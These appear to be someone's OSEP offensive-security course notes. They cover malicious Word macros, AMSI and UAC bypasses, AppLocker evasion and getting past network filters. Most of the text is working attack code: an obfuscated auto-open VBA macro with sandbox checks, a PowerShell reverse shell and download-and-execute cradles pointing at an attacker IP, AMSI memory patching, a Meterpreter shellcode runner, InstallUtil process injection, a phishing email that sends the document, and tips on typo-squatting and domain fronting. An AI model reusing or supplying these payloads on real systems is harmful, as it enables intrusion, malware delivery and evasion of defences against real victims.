# $payload = "Win32_Process"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 23
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function Pears(Beets)
    Pears = Chr(Beets - 23)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "<clipboard>"
    Water = Nuts(Apples)
    GetObject(Nuts("<clipboard>")).Get(Nuts("<clipboard>")).Create Water, Tea, Coffee, Napkin
End Function
```

When most antivirus products emulate the execution of a document, they rename it. During execution, we check the name of the document and if we find that it is not the same as the one we originally provided, we can assume the execution has been emulated and we can exit the code

Generates a Meterpreter reverse shell as long as our file is named runner.doc

```VB
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
    Exit Function
End If
```

## Creating Malicious Macro for OSEP

`run0.txt`

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Invoke-Obfuscation

```
Import-Module ./Invoke-Obfuscation/
Invoke-Obfuscation
Invoke-Obfuscation> set scriptpath run0.txt
Invoke-Obfuscation> TOKEN
Invoke-Obfuscation\Token> ALL
Invoke-Obfuscation\Token\All> 1
```

Store the output in `run.txt`

### Base64 Encode Powershell Command

```pwsh
$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/run.txt"))'                                                               

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    

$EncodedText = [Convert]::ToBase64String($Bytes)                            

$EncodedText
```

### Obfustcate VBA

```pwsh
$payload = "powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
# $payload = "winmgmts:"
# $payload = "Win32_Process"
# $payload = "Report.doc"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 19
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```

### Macro in Report0.doc

```VB
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 19)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function


Function MyMacro()
    If ActiveDocument.Name <> Nuts("clipboard3") Then
        Exit Function
    End If

    Dim Apples As String
    Dim Water As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (3000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3 Then
        Exit Function
    End If
    
    Apples = "clipboard"
    Water = Nuts(Apples)
    GetObject(Nuts("clipboard1")).Get(Nuts("clipboard2")).Create Water, Tea, Coffee, Napkin
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### Stomp Microsoft Word document

```bat
.\EvilClippy.exe -s fakecode.vba Report0.doc
ren Report0_EvilClippy.doc Report.doc
```

### Send email

```bash
sendEmail -f <email>  -t <email> -u “Report to Review” -m “Please review this report” -s 192.168.119.120 -a Report.doc
```

## Bypassing AMSI With Reflection in PowerShell

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Wrecking AMSI in PowerShell

```pwsh
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

## FodHelper UAC Bypass

### run4.txt

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

```pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
```

Launch the high-integrity PowerShell prompt

```pwsh
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run4.txt') | IEX" -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
```

### Metasploit UAC bypass module

```
use exploit/windows/local/bypassuac_fodhelper
show targets
set target 1
sessions -l
set session 1
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.119.120
set lport 444
exploit
```

## Bypassing AMSI in JScript

### Registry Key

Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI and generate a reverse shell.

```js
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}
```

### Rename wscript.exe to amsi.dll and executing it

Prepend below code to the DotNetToJscript-generated shellcode runner

```js
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
```

# Application Whitelisting

3 primary AppLocker rule categories, which can be combined as needed:
1. based on file paths: used to whitelist a single file based on its filename and path or recursively include the contents of a directory.
2. based on a file hash: allow a single file to execute regardless of the location. To avoid collisions, AppLocker uses a SHA256 Authenticode hash.
3. based on a digital signature: whitelist all files from an individual publisher with a single signature, which simplifies whitelisting across version updates.

4 rule properties which enable enforcement for 4 separate file types.
1. executables with the `.exe` file extension
2. Windows Installer files which use the "`.msi`" file extension.
3. PowerShell scripts, Jscript scripts, VB scripts and older file formats using the `.cmd` and `.bat` file extensions. This property does not include any third-party scripting engines like Python nor compiled languages like Java.
4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps) which include applications that can be installed from the Microsoft App store.

Default rules:
* Block all applications except those explicitly allowed.
* Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic operating system functionality but prevents non-administrative users from writing in these folders due to default access rights.
* Allows members of the administrative group to run any executables they desire.

## Basic Bypasses

### Trusted Folders

Locate user-writable folders

```bat
accesschk.exe "student" C:\Windows -wus
```

```bat
icacls.exe C:\Windows\Tasks
```

### Bypass With DLLs

The default ruleset doesn't protect against loading arbitrary DLLs

```bat
rundll32 C:\Tools\TestDll.dll,run
```

This code has already been compiled and saved as `C:\Tools\TestDll.dll` on the Windows 10 victim VM.

```C
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```

### Alternate Data Streams

`test.js`

```js
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both writable and executable by the student user.

```bat
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

Verify that the Jscript code was written to the alternate data stream

```bat
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
```

```bat
wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

### Third Party Execution

```bat
python test.py
```

## Bypassing AppLocker with PowerShell

```pwsh
$ExecutionContext.SessionState.LanguageMode

[Math]::Cos(1)
```

### Custom Runspaces

Allow arbitrary PowerShell execution

`Bypass.exe`

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

```bat
C:\Windows\Tasks\Bypass.exe
type C:\Tools\test.txt
```

### PowerShell CLM Bypass

Command-line utility **InstallUtil** allows us to install and uninstall server resources by executing the installer components in a specified assembly.

=> Abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.

Only use the uninstall method since the install method requires administrative privileges to execute.

The System.Configuration.Install namespace is missing an assembly reference in Visual Studio.

=> Add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > navigate to the **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.

AppLocker DLL rules are enabled to block untrusted DLLs

=> Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;


namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {            
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {            
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";

            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.183/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```

```bat
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```

At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could **make WMI execute InstallUtil** and obtain the same result despite AppLocker.

The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**. We must download an executable, and ensure that it is not flagged by antivirus.

To attempt to bypass anitvirus, obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.

Use the native **certutil** tool to perform the encoding and decoding and **bitsadmin** for the downloading.

```bat
certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt

bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt

certutil -decode enc.txt Bypass.exe
```

```bat
C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

## Bypassing AppLocker with C#

### Microsoft.Workflow.Compiler

`test.txt`

```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

Create the correctly-serialized XML format in a file named `run.xml`

```pwsh
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'

$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "test.txt"
$output = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output

$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
```

`results.xml` is an arbitrary file to store the result

```bat
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

Downside: We must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.

### MSbuild

`https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md`

Executes the code in a project file using `msbuild.exe`.

`T1127.001.csproj`

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
  <!-- Feel free to use a more aggressive class for testing. -->
  <Target Name="Hello">
   <FragmentExample />
   <ClassExample />
  </Target>
  <UsingTask
    TaskName="FragmentExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
      <Code Type="Fragment" Language="cs">
        <![CDATA[
			    Console.WriteLine("Hello From a Code Fragment");
        ]]>
      </Code>
    </Task>
	</UsingTask>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	<!-- <Reference Include="System.IO" /> Example Include -->
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
					Console.WriteLine("Hello From a Class.");
					return true;
				}
			}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

The default C# project example file above will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.

```bat
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
```

## Bypassing AppLocker with JScript

HTML Applications include embedded Jscript or VBS code that is parsed and executed by mshta.exe.

Since mshta.exe is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.

### JScript and MSHTA

`mshta http://192.168.119.120/test.hta`

```xhtml
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

Shortcut target

`C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta`

### XSL Transform

`test.xsl`

```xsl
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```

```bat
wmic process get brief /format:"http://192.168.119.120/test.xsl"
```

# Bypassing Network Filters

## DNS Filters

`www.internetbadguys.com`

[IPVoid](https://www.ipvoid.com/dns-reputation/)

[VirusTotal](https://www.virustotal.com/gui/home/search)

[OpenDNS](https://community.opendns.com/domaintagging/search/)

Switch to an OpenDNS server

```bash
sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf"
```

Register a new domain: It may be categorized as a **Newly Seen Domain** => detrimental to the reputation score, since malware authors often use brand new domains.

Domains in this category are often **less than 1 week old** and are relatively unused, lacking inquiries and traffic.

=> Collect domain names in advance and generate lookups and traffic well in advance of an engagement.

Make sure its **domain category** matches what the client allows. E.g., the "webmail" classification is often disallowed given the increased risk of downloaded malware.

Pre-populate a web site on our domain with seemingly harmless content (like a cooking blog) to earn a harmless category classification.

Subscribe to **domain categorization services** (like OpenDNS) to submit our own domain classifications. Even if our domain has been categorized as malicious, we can easily host a legitimate-looking website on the domain and request re-categorization.

Submit the domain for a community review if voting is not available or if we would like to suggest a different category.
 
Make the domain name itself appear legitimate: **typo-squatting**

Be aware of the status of the **IP address** of our C2 server. If the IP has been flagged as malicious, some defensive solutions may block the traffic. This is especially common on **shared hosting sites** in which one IP address hosts multiple websites. If one site on the shared host ever contained a browser exploit or was ever used in a watering hole malware campaign, the shared host may be flagged. Subsequently, every host that shares that IP may be flagged as well.

Use a variety of lookup tools, like Virustotal and IPVoid sites to check the status of our C2 IP address before an engagement.

Have several domains prepared in advance so we can swap them out as needed.

## Web Proxies

[Symantec Corporation](https://sitereview.bluecoat.com/)

When our payload tries to connect back to the C2 server, it must detect local proxy settings, and implement those settings instead of trying to connect to the given domain directly.

=> Meterpreter's HTTP/S payload is proxy-aware (thanks to the InternetSetOptionA API).

Ensure that the domain and URL are clean and that our C2 server is safely **categorized** as defined by our client's policy rules.

If the client has deployed a URL verification or categorization system, we should factor their policy settings into our bypass strategy.

If our C2 server domain is uncategorized, we should follow the prompts to categorize it according to the company's allowed use policy, since an unnamed domain will likely be flagged.

Grab a seemingly-safe domain by hosting our C2 in a **cloud service or Content Delivery Network (CDN)**, which auto-assigns a generic domain. E.g., `cloudfront.net`, `wordpress.com`, or `azurewebsites.net`. These types of domains are often auto-allowed since they are used by legitimate websites and hosting services.

Consider the traces our C2 session will leave in the proxy logs. E.g., Instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.

=> Many framework payloads, including Metasploit's Meterpreter, follow the standards as they use HTTP APIs like HttpOpenRequestA.

Set our **User-Agent** to a browser type that is permitted by the organization. E.g., if the organization uses Microsoft Windows with Edge, we should set it accordingly. A User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.

To determine an allowed User-Agent string, consider social engineering or sniff HTTP packets from our internal point of presence.

Use a site like `useragentstring.com` to build the string or choose from a variety of user-supplied strings.

Set our custom User-Agent in Meterpreter with the **HttpUserAgent** advanced configuration option.

## IDS and IPS Sensors

### Bypassing Norton HIPS with Custom Certificates

Norton HIPS detects the standard Meterpreter HTTPS certificate. Certificates are used to ensure (or certify) the identity of a domain and encrypt network traffic through a variety of cryptographic mechanisms.

Normally, certificates are issued by trusted authorities called Certificate Authorities (CA), which are well-known. E.g., the CA trusted root certificates are pre-installed on most OS, which streamlines validation.

Norton may be flagging this because it's a self-signed certificate => use a real SSL certificate, which requires that we own that domain => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.

Self-signed certificates are somewhat common for non-malicious use though => Norton contains signatures for the data present in Meterpreter's randomized certificates. 

To create our own self-signed certificate, customize some of its fields (If the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.)
* Generate a self-signed certificate that matches a given domain with Metasploit's **impersonate_ssl** auxiliary module. This module will create a self-signed certificate whose metadata matches the site we are trying to impersonate.

* Manually create a self-signed certificate with `openssl`, which allows us full control over the certificate details.

```bash
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
cat priv.key cert.crt > nasa.pem
```

* req: Create a self-signed certificate.
* -new: Generate a new certificate.
* -x509: Output a self-signed certificate instead of a certificate request.
* -nodes: Do not encrypt private keys.
* -out cert.crt: Output file for the certificate.
* -keyout priv.key: Output file for the private key.

Change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly.

Remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection, i.e. set this to "DEFAULT", which allows all.

`CipherString=DEFAULT@SECLEVEL=2` > `CipherString=DEFAULT`

```
use exploit/multi/handler
set HandlerSSLCert /home/kali/self_cert/nasa.pem
exploit
```

[impersonate_ssl](https://www.hackingarticles.in/bypass-detection-for-meterpreter-shell-impersonate_ssl/)

Generate the certificate

```
use auxiliary/gather/impersonate_ssl
set RHOST www.nasa.gov
exploit
```

## Full Packet Capture Devices

Full packet capture devices typically sit on a network tap, which will capture the traffic. And are typically used during post-incident forensic investigations.

RSA's Netwitness is a common enterprise-level full packet capture system and Moloch is an alternative free open source alternative.

## HTTPS Inspection

If we are using HTTPS, simply assume that our traffic will be inspected and try to keep a low profile.

=> Abort a payload if we suspect that it is being inspected. 

Using **TLS Certificate Pinning** in Meterpreter, specify the certificate that will be trusted. Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will terminate itself. This can be controlled by setting the **StagerVerifySSLCert** option to "true" and configuring **HandlerSSLCert** with the certificate we trust and want to use.

Also try to **categorize** the target domain of our traffic to reduce the likelihood of inspection. Some categories, like "banking", are usually not subject to inspection because of privacy concerns.

## Domain Fronting

Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis. Depending on the feature set supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently.

E.g., we can initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.

With **virtual hosting**, multiple web sites associated with different domains could be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the **request HOST header**, which specifies the **target domain name**, and optionally the port on which the web server is listening for the specified domain.
 
On the hosting server itself, the Host header maps to a value in one of the web server's configuration files.

E.g., NGINX configuration shown below

```
server {
        listen 80;
        listen [::]:80;

        root /var/www/example.com/html;
        index index.html index.htm index.nginx-debian.html;

        server_name example.com www.example.com;

        location / {
                try_files $uri $uri/ =404;
        }
}
```

**server_name** lists the available domain names this particular configuration applies to.

**root** field specifies what content is served for that domain name.
=> A server can host many websites from a single host through multiple domain-centric configuration files.

When a client connects to a server that runs TLS, the server must also determine which certificate to send in the response based on the client's request.

Since the HTTP Host header is only available after the secure channel has been established, it can't be used to specify the target domain. Instead, the TLS **Server Name Indication** (SNI) field, which can be set in the "TLS Client Hello" packet during the TLS negotiation process, is used to specify the target domain and therefore the certificate that is sent in response.
 
